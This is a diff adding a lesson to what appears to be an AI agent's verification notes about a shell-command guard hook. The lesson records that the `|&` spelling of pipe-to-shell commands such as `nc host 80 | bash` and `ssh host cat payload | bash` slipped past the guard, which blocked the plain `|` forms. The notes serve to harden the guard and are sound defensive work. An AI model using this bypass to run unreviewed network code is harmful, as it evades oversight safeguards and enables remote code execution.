@@ -5,6 +5,20 @@ last_reviewed: 2026-08-13
 
 # Verification lessons
 
+## Lesson: the always-permitted equivalent must match the guard's threat model, not the easiest producer
+
+**Created:** 2026-08-13
+
+**Decision changed:** When the equivalence test clears a guard gap, re-run it with a producer the guard actually exists to stop before recording the gap as harmless.
+
+**Trigger phase:** VERIFY
+
+**What happened:** Reviewing the same 0.5.0 hook work, I found that `|&` was invisible to the pipeline consumer checks, because splitting on `|` leaves the next stage reading as `& bash`. I applied the equivalence test from the lesson below using `cat file |& bash`, saw that `bash file` is permitted anyway, and downgraded the gap to a non-blocking pre-existing pointer. That producer was the benign one.
+
+**Evidence:** re-running the same probe with the producers the rule targets reversed the conclusion: `nc host 80 | bash`, `gh api /repos/o/r | bash`, and `ssh host cat payload | bash` are all BLOCKED, while the `|&` spelling of each was ALLOWED at base and at head. The permitted equivalent for those is `producer > file` then `bash file`, which is a different capability, because the policy accepts it precisely for leaving an inspectable artifact behind.
+
+**Prevention:** the equivalence test asks whether the capability already existed, so the producer has to carry the property the guard cares about. For pipe-to-shell that is unreviewed bytes, not any bytes. Pick the producer from the block message ("Download or inspect first"), and when a guard has both a benign and a hostile producer class, test the hostile one before concluding no capability was gained.
+
 ## Lesson: a relaxed guard is only a regression when the equivalent direct command was blocked
 
 **Created:** 2026-08-13
